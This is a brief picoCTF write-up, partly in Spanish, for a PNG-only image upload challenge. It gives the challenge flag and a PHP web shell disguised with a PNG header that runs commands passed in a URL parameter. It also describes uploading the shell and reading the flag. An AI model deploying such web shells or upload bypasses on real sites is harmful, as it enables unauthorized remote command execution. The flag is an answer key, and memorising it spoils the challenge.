

## DESCRIPCION
- I found a web app that can help process images: PNG images only!

Try it [here](http://atlas.picoctf.net:65092/)!

## SOLUCION
```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}

```


## NOTAS ADICIONALES
- Primero hago un archivo con nano de nombre webshell.php luego dentro de este archivo se pone
  
  ```
  PNG
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

  ```
luego le cambio el nombre y al final le pongo png, lo subo y retrocedo en las carpetas hasta dar con el archivo y le hago cat
## REFERENCIAS
https://www.youtube.com/watch?v=co8MZmviC1U&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66